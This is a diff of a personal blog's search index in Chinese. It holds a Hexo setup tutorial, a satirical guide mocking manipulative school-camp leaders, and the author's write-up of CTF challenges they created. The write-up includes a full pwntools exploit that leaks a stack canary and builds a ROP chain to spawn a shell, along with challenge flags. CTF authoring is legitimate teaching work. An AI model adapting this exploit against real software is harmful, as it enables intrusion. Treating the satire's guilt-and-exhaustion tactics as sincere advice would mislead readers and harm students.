-<h2 id="第五步-把網頁交給-github"><a href="#第五步-把網頁交給-github" class="headerlink" title="第五步:把網頁交給 github"></a>第五步:把網頁交給 github</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">// 刪除舊版檔案</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">// 生成網頁檔案</span><br><span class="line">hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>輸入後就會看到多了一個 public 資料夾<br>把裡面的東西全部上傳到剛剛創的repository就大功告成<br>(不過當然如果你會用 git 就當我沒說)</p>
-<h2 id="延伸補充"><a href="#延伸補充" class="headerlink" title="延伸補充"></a>延伸補充</h2><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">// 刪除上次 generate 的檔案</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">// 把檔案整理到 public 資料夾</span><br><span class="line">hexo generate</span><br><span class="line"></span><br><span class="line">// 一鍵同步，需要先設定，下方附上連結</span><br><span class="line">hexo deploy</span><br><span class="line"></span><br><span class="line">// 新增頁面之類的，layout主要有 </span><br><span class="line">// post(一篇新貼文) page(頁面，例如<span class="string">&quot;關於我&quot;</span>頁面) draft(草稿，會先存著等待發布)</span><br><span class="line">// title 如果有包含空格要用雙引號包起來</span><br><span class="line">hexo new [layout] &lt;title&gt;</span><br><span class="line"></span><br><span class="line">// 在本地運行</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure></div>
-<p><a class="link"   href="https://hexo.io/docs/one-command-deployment" >Hexo 一鍵部屬 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-      <categories>
-        <category>教學</category>
-      </categories>
-      <tags>
-        <tag>網頁</tag>
-        <tag>教學</tag>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -451,10 +422,147 @@ erase(n)
         <category>程式題解</category>
       </categories>
       <tags>
+        <tag>note</tag>
         <tag>C++</tag>
         <tag>題解</tag>
-        <tag>筆記</tag>
         <tag>動態規劃</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>高中隔宿領隊教官新手指南</title>
+    <url>/2024/09/15/HowToBeDuuuumb/</url>
+    <content><![CDATA[<p>由 <em>格里西亞</em> 編寫，如有廠商想放入員工手冊作為員工教育的教材，請私下聯繫我</p>
+<p>聲明：</p>
+<ul>
+<li>所有人名與劇情純屬虛構，皆無影射現實，如有相似純屬巧合</li>
+<li>若發現奇怪的名字，一定是我打錯，純屬巧合</li>
+<li>格里西亞不是蛤蜊蝦</li>
+</ul>
+<h2 id="如何讓學生聽話"><a href="#如何讓學生聽話" class="headerlink" title="如何讓學生聽話"></a>如何讓學生聽話</h2><h3 id="軍事化管理"><a href="#軍事化管理" class="headerlink" title="軍事化管理"></a>軍事化管理</h3><p>學生平常在家都過的爽爽的，對我們這些崇高的大人們十分沒有禮貌，所以我們應該利用 <strong>軍事化的管理</strong> 加強對學生的控制。</p>
+<p>具體事項包含：</p>
+<ul>
+<li>強烈要求學生服從每個指令</li>
+<li>扮演教官身著軍裝</li>
+<li>要求學生背誦軍歌並大聲唱出來</li>
+<li>活用勞動擊潰學生身體，如：不斷起立蹲下、要求學生在營地奔跑、強烈要求學生在晚會不斷跳躍與揮手</li>
+<li>活用不適感擊潰學生心理，如：要求學生在地上端坐兩個小時、晚上只以清水洗澡並且不得洗頭、在學生疲憊時仍強烈要求從事高體力消耗活動</li>
+</ul>
+<hr>
+<h3 id="糖與鞭子"><a href="#糖與鞭子" class="headerlink" title="糖與鞭子"></a>糖與鞭子</h3><p>在前面高度施壓下，學生將會越來越疲倦，並且開始拒絕服從命令，所以我們應該在高度施壓的情況下，同時給予一些甜頭，並說服學生服從。</p>
+<p>具體事項包含：</p>
+<ul>
+<li>給予<strong>友好的第一印象以及最後印象</strong>，可以在來回的遊覽車上跟學生打好關係，讓他們認為我們是好朋友，這次的旅行將會很愉快。並且在出發時給予一些正面的關鍵字，例如：成長、英雄、體驗、同樂</li>
+<li><strong>理直氣壯的給予獎勵</strong>，即使獎勵本身沒有任何意義，舉例：<em>讓聽話的中隊先洗澡，即使本來就安排他們先，也要表現的好像這是在獎勵他們的聽話</em>、<em>發放運動飲料給學生，並說這是看在你們優良表現的份上，即使飲料發放早就是事先預定好的</em>、<em>將毫無意義的分數與金幣描述的非常重要(也可以完全不做描述，讓他們完全不知道它的功能，只知道領隊一直告訴他們要去追求分數，畢竟現在的學生只要聽到分數就會自己開始擔心了)，讓學生為了追求分數而絕對服從長官指示</em></li>
+<li>在從事強烈體力與精神消耗的前後，對學生施以<strong>道德綁架</strong>，讓其不得不服從，如：<em>這都是為了我們這個團體，你不認真就會成為眾矢之的，害所有人的努力白費</em>、<em>我們是一個團隊，你們任何一個人都會影響到最終成敗</em>、<em>要是因為一個人導致我們輸了，你們難道不感覺可恥嗎</em></li>
+</ul>
+<p>*註1：所有獎勵發放時都需要表明，這不是學生們應得的，而是我們看在他們努力的份上，勉為其難的施捨。</p>
+<p>*註2：在實施 <strong>道德綁架</strong> 以及 <strong>獎勵發放</strong> 時都要表明身為領隊的苦楚，讓學生認為領隊與他們站在同一陣線，例如：我真的很想幫大家贏得勝利，我們大家是一夥的，我們要努力拼過其他中隊，大家趕快去搶分數</p>
+<p>*註3：好好的運用 <strong>道德綁架</strong> 能有效的讓學生自行產生擔心自己拖累同伴的心理，基於害怕他們便會乖乖的聽從指揮</p>
+<h2 id="如何讓學生認為這次隔宿是有趣的"><a href="#如何讓學生認為這次隔宿是有趣的" class="headerlink" title="如何讓學生認為這次隔宿是有趣的"></a>如何讓學生認為這次隔宿是有趣的</h2><h3 id="運用上面的學生管理技巧"><a href="#運用上面的學生管理技巧" class="headerlink" title="運用上面的學生管理技巧"></a>運用上面的學生管理技巧</h3><p>最重要的就是讓學生認為領隊跟他們是站在同一陣線，並且真心為他們著想的。再來就是不定時給予一些獎勵，讓學生對領隊心懷感激。</p>
+<hr>
+<h3 id="學生對領隊的印象很重要"><a href="#學生對領隊的印象很重要" class="headerlink" title="學生對領隊的印象很重要"></a>學生對領隊的印象很重要</h3><p>第一印象一定要好，這樣之後嚴格管理學生時，他們才不會覺得我們是壞人，而是更傾向於相信我們。</p>
+<p>最後印象也一定要好，快要離開營區就不要再罵學生了，讓他們盡情的玩樂。最後在遊覽車上可以花時間來為學生回顧這兩天發生的事，畢竟就算再怎麼辛苦，學生們這兩天總有一個時候是快樂的，雖然這很有可能是因為跟同學的互動，但藉由回顧行程，會讓學生認為自己撐過去了，並把學生對同學間有趣的小事所產生的快樂 誤認為是整個行程所帶來的快樂。最後要確保回程的路上車內氣氛是愉快的，這樣那些傻孩子就會認為整個行程是愉快的。</p>
+<p>至於在營區的這段時間，就是嚴加控管，怎麼罵學生都可以，但要注意不定時依照上述原則施以小惠，讓學生不會到憎恨領隊的地步</p>
+<h2 id="如何確保學生安全"><a href="#如何確保學生安全" class="headerlink" title="如何確保學生安全"></a>如何確保學生安全</h2><p>怎麼會有這標題，這很重要嗎？<br>他們會自己照顧自己<br>跳過</p>
+<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Q:我是主張愛的教育的領隊，請問一定要用兇的嗎？</p>
+<p><del>A:不用兇學生我們要去哪裡釋放壓力，你有病吧</del></p>
+<p>A:我們也是主張愛的教育，但學生們平時安逸慣了，總得給他們好好上一課，所以我們不得不接手這個重責大任。</p>
+<hr>
+<p>Q:我們領隊過的太開心會不會讓學生不爽啊？</p>
+<p><del>A:實例：蛤蜊蝦同學在第二天起床氣爆炸後，看到小白癡領隊一臉悠哉，瀏海上還有髮捲的時候差點失控打人，所以當然會啊</del></p>
+<p>A:可以放心喔，學生們就是要來鍛鍊耐力的，相信他們可以體諒我們領隊的辛苦。</p>
+<hr>
+<p>Q:我在營隊對同學這麼兇，他們會不會很討厭我啊？</p>
+<p><del>A:實例：蛤蜊蝦同學正在寫新手領隊指南，同時嘗試 OSINT 領隊讓他們失業</del></p>
+<p>A:我們的同仁都用了最大的努力在照顧同學了，我們這麼辛苦，他們要是還討厭我們那是他們的損失，我們領隊超棒的！</p>
+<hr>
+<p>Q:可以請蛤蜊蝦同學分享一下感想嗎？</p>
+<p><del>A:蛤蜊蝦：各位同學，仔細想想這趟旅程，園區的體驗本身大多都很無趣，晚上的住宿與盥洗十分可悲。雖然不能否認我有幾個瞬間是開心的，但那都是因為有同學的陪伴，而不是因為學校或旅行社的安排。我認為如果是一模一樣的行程，我們自己揪團肯定會更開心百倍。雖然這讓我感到厭惡，但領隊在一件事上是對的「比起畢旅或其他活動成長營絕對會讓你們印象深刻」，我的確印象深刻，我記得我在領隊命令下的那種不情願；我記得我在領隊辱罵聲中感到的憤怒；我記得那火辣的太陽、堅硬的地板、悶熱的帳逢、強迫你開心的晚會、不斷轉換黑臉白臉的教官。我記得而且將<strong>永遠</strong>記得。</del></p>
+<p>A:不好意思，我們不知道你在說哪位。</p>
+]]></content>
+      <categories>
+        <category>日常生活</category>
+      </categories>
+      <tags>
+        <tag>日常</tag>
+        <tag>高中生活</tag>
+        <tag>抱怨文</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>thjcc_winter_writeup</title>
+    <url>/2024/12/15/thjcc-winter-writeup/</url>
+    <content><![CDATA[<h1 id="CTF-比賽出題初體驗"><a href="#CTF-比賽出題初體驗" class="headerlink" title="CTF 比賽出題初體驗"></a>CTF 比賽出題初體驗</h1><p>這次擔任 <code>THJCC 第二屆</code> 的出題者<br>算是我第一次正式出題的體驗<br>題目有不好的地方就請見諒</p>
+<p><del>比賽前一天發現自己把題解刪掉了，害我連夜重寫一份 exploit</del></p>
+<h2 id="pwn-TheBestAnime"><a href="#pwn-TheBestAnime" class="headerlink" title="pwn-TheBestAnime"></a>pwn-TheBestAnime</h2><h3 id="題序"><a href="#題序" class="headerlink" title="題序"></a>題序</h3><h4 id="題序-1"><a href="#題序-1" class="headerlink" title="題序"></a>題序</h4><hr>
+<p>那似乎是ROP，<br>這種攻擊天生單翼，<br>需要Gadgets相互扶持依偎，<br>否則無法翱翔天際，<br>是種有缺陷的生物。<br>但是，不知為何，<br>我卻認為，<br>這種生存方式是美好的。</p>
+<hr>
+<p>“The ROP, also known as “the payload that shares wings,” only possesses one wing. Unless gadgets lean on each other and act as one, they’re incapable of flight. They’re imperfect, incomplete creatures. But, for some reason, their way of life, struck me as profoundly beautiful. It was beautiful, I felt.”</p>
+<p><code>Author: Grissia</code></p>
+<hr>
+<h4 id="檔案"><a href="#檔案" class="headerlink" title="檔案"></a>檔案</h4><ul>
+<li>chal</li>
+</ul>
+<h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><p>這題大概的解法就是在 <code>darling</code> 函式中有 <code>OOB</code> 可以 leak canary<br>leak canary 之後可以在 <code>main</code> 最後 <code>gets</code> 構建 rop chain  </p>
+<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>用 ida 直接反組譯後可以看到第一步就是要輸入 <code>Darling in the FRANXX</code>  </p>
+<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>跳轉到 <code>darling</code> 函式後有一個很明顯的 <code>OOB</code><br>可以分別輸入 <code>14</code> <code>15</code> 來得到兩段 canary  </p>
+<h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>用剛剛得到的 canary 值就可以放心 overflow<br>構建 rop chain 後就大功告成</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;wt.exe&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(<span class="string">&quot;./chal&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    r = process(<span class="string">&quot;./chal&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(r)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    r = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: python3 &#123;&#125; [GDB | REMOTE_IP PORT]&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;Darling in the FRANXX&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;15&#x27;</span>)</span><br><span class="line">upper = r.recvline().decode().split()[<span class="number">1</span>]</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;14&#x27;</span>)</span><br><span class="line">lower = r.recvline().decode().split()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(upper+lower, <span class="number">16</span>)</span><br><span class="line">success(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">rax = 0x3b</span></span><br><span class="line"><span class="string">rdi = /bin/sh\x00</span></span><br><span class="line"><span class="string">rsi = 0</span></span><br><span class="line"><span class="string">rdx = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0000000000434bbb : pop rax ; ret</span></span><br><span class="line"><span class="string">0x0000000000433f95 : mov qword ptr [rsi], rax ; ret</span></span><br><span class="line"><span class="string">0x000000000041fcf5 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x00000000004571e7 : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000494253 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000432f5b : mov rdx, rbx ; syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">pop_rax = <span class="number">0x434bbb</span></span><br><span class="line">mov_rsi_rax = <span class="number">0x433f95</span></span><br><span class="line">pop_rsi = <span class="number">0x41fcf5</span></span><br><span class="line">pop_rbx = <span class="number">0x4571e7</span></span><br><span class="line">mov_rdx_rbx = <span class="number">0x432f5b</span></span><br><span class="line">pop_rdi = <span class="number">0x494253</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">rop += p64(canary)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax)</span><br><span class="line">rop += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(<span class="number">0x4cccc0</span>)  <span class="comment"># somewhere writable</span></span><br><span class="line">rop += p64(mov_rsi_rax)  <span class="comment"># set /bin/sh</span></span><br><span class="line">rop += p64(pop_rbx)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax)  <span class="comment"># set rax</span></span><br><span class="line">rop += p64(<span class="number">0x3b</span>)</span><br><span class="line">rop += p64(pop_rdi)  <span class="comment"># set rdi</span></span><br><span class="line">rop += p64(<span class="number">0x4cccc0</span>)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(mov_rdx_rbx)  <span class="comment"># set rdx</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, rop)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><a class="link"   href="https://github.com/Grissia/TheBestAnime" >TheBestAnime <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="misc-Happy-College-Life"><a href="#misc-Happy-College-Life" class="headerlink" title="misc-Happy College Life"></a>misc-Happy College Life</h2><h3 id="題序-2"><a href="#題序-2" class="headerlink" title="題序"></a>題序</h3><h4 id="題序-3"><a href="#題序-3" class="headerlink" title="題序"></a>題序</h4><p>Where is this place ???</p>
+<p>把拍照位置的經緯度座標放到 <code>THJCC&#123;&#125;</code> 裡面，並且單位保留到分，像是 <code>24°59&#39;57.8&quot;N 121°19&#39;34.4&quot;E</code> 要被表示成 <code>THJCC&#123;2459N,12119E&#125;</code></p>
+<hr>
+<p>Put the found latitude and longitude into the format <code>THJCC&#123;&#125;</code> and keep the precision up to the minutes. For example, <code>24°59&#39;57.8&quot;N 121°19&#39;34.4&quot;E</code> should be submitted as <code>THJCC&#123;2459N,12119E&#125;</code>.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJXKtiKVJe.jpg"
+                      alt="secret_place"
+                ></p>
+<blockquote>
+<p>Author: Grissia</p>
+</blockquote>
+<h4 id="檔案-1"><a href="#檔案-1" class="headerlink" title="檔案"></a>檔案</h4><ul>
+<li>secret_place.jpg</li>
+</ul>
+<hr>
+<h3 id="想法-1"><a href="#想法-1" class="headerlink" title="想法"></a>想法</h3><p>最明顯的是樹後面有一個超大的藍色金字塔<br>放大圖片還可以看到垃圾桶上 Long Beach 的 logo<br>而且題目名稱就是 <code>Happy College Life</code><br>可以推測這是某個大學裡的地點  </p>
+<p>btw，這張照片是我去 <code>CSULB</code> 的時候在宿舍門口拍的  </p>
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p><code>THJCC&#123;3346N,11807W&#125;</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>WriteUp</tag>
+        <tag>pwn</tag>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>用hexo創建部落格</title>
+    <url>/2024/08/21/build-a-blog-with-hexo/</url>
+    <content><![CDATA[<h2 id="第一步-下載-node-js"><a href="#第一步-下載-node-js" class="headerlink" title="第一步:下載 node.js"></a>第一步:下載 node.js</h2><p>可以到 <a class="link"   href="https://nodejs.org/" >node.js <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 下載最新的版本<br>下一步 下一步 下一步 安裝成功</p>
+<h2 id="第二步-github-設定"><a href="#第二步-github-設定" class="headerlink" title="第二步: github 設定"></a>第二步: github 設定</h2><p>因為我是用 github pages<br>所以會需要用到 github 來公開網站<br>然後最好下載 git 這樣可以用 git bash 比較不會出錯</p>
+<h3 id="在-github-創建一個新的-repository"><a href="#在-github-創建一個新的-repository" class="headerlink" title="在 github 創建一個新的 repository"></a>在 github 創建一個新的 repository</h3><p>名字取作 你的帳號.github.io 例如:(grissia.github.io)<br>然後其他都留預設就可以了(尤其是 repo 要設公開)</p>
+<h2 id="第三步-安裝-hexo"><a href="#第三步-安裝-hexo" class="headerlink" title="第三步:安裝 hexo"></a>第三步:安裝 hexo</h2><p>可以到 <a class="link"   href="https://hexo.io/" >Hexo的官網 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>或用我底下附的指令<br><strong>這些指令在git bash執行才不會出錯</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">// 安裝hexo</span><br><span class="line">npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">// 創建一個叫做blog的網頁專案</span><br><span class="line">hexo init blog</span><br><span class="line"></span><br><span class="line">// 進入剛創的資料夾</span><br><span class="line"><span class="built_in">cd</span> blog</span><br><span class="line"></span><br><span class="line">// 加載 npm</span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line">// 在本地運行(目前不需要)</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="第四步-挑選主題"><a href="#第四步-挑選主題" class="headerlink" title="第四步:挑選主題"></a>第四步:挑選主題</h2><p>到剛剛的 hexo 官網選擇喜歡的主題，然後根據該主題的說明一步步安裝即可<br><strong>記得改 _config.yml 裡面的 theme 選項</strong></p>
+<h2 id="第五步-把網頁交給-github"><a href="#第五步-把網頁交給-github" class="headerlink" title="第五步:把網頁交給 github"></a>第五步:把網頁交給 github</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">// 刪除舊版檔案</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">// 生成網頁檔案</span><br><span class="line">hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>輸入後就會看到多了一個 public 資料夾<br>把裡面的東西全部上傳到剛剛創的repository就大功告成<br>(不過當然如果你會用 git 就當我沒說)</p>
+<h2 id="延伸補充"><a href="#延伸補充" class="headerlink" title="延伸補充"></a>延伸補充</h2><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">// 刪除上次 generate 的檔案</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">// 把檔案整理到 public 資料夾</span><br><span class="line">hexo generate</span><br><span class="line"></span><br><span class="line">// 一鍵同步，需要先設定，下方附上連結</span><br><span class="line">hexo deploy</span><br><span class="line"></span><br><span class="line">// 新增頁面之類的，layout主要有 </span><br><span class="line">// post(一篇新貼文) page(頁面，例如<span class="string">&quot;關於我&quot;</span>頁面) draft(草稿，會先存著等待發布)</span><br><span class="line">// title 如果有包含空格要用雙引號包起來</span><br><span class="line">hexo new [layout] &lt;title&gt;</span><br><span class="line"></span><br><span class="line">// 在本地運行</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure></div>
+<p><a class="link"   href="https://hexo.io/docs/one-command-deployment" >Hexo 一鍵部屬 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <categories>
+        <category>教學</category>
+      </categories>
+      <tags>
+        <tag>網頁</tag>
+        <tag>教學</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
 </search>
